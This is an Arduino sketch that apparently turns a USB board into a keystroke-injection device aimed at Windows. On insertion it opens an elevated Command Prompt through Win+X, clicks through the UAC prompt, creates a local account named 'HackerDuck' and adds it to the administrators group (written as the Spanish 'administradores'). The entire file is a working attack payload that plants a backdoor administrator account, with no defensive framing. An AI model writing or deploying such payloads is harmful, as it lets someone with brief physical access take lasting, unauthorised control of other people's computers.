#include <HID.h>
#include <Keyboard.h>
#include <stdio.h>

char pipe_char; 

// Init function
void setup()
{
  pipe_char = 124;
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  // press Windows+X
  delay(400);
  Keyboard.press(KEY_LEFT_GUI);
  delay(300);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(400);

  // launch Command Prompt (Admin)
  typeKey('a');
  delay(500);

  // klik "Yes"
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  typeKey(KEY_RETURN); 
  Keyboard.releaseAll();
  delay(500);

  // add user
  Keyboard.println("net user /add HackerDuck quack");
  typeKey(KEY_RETURN);  
  delay(100);
  Keyboard.print("net localgroup administradores HackerDuck /add");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("exit");
 //typeKey(KEY_RETURN);

  Keyboard.end();
}

// Unused
void loop() {}

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}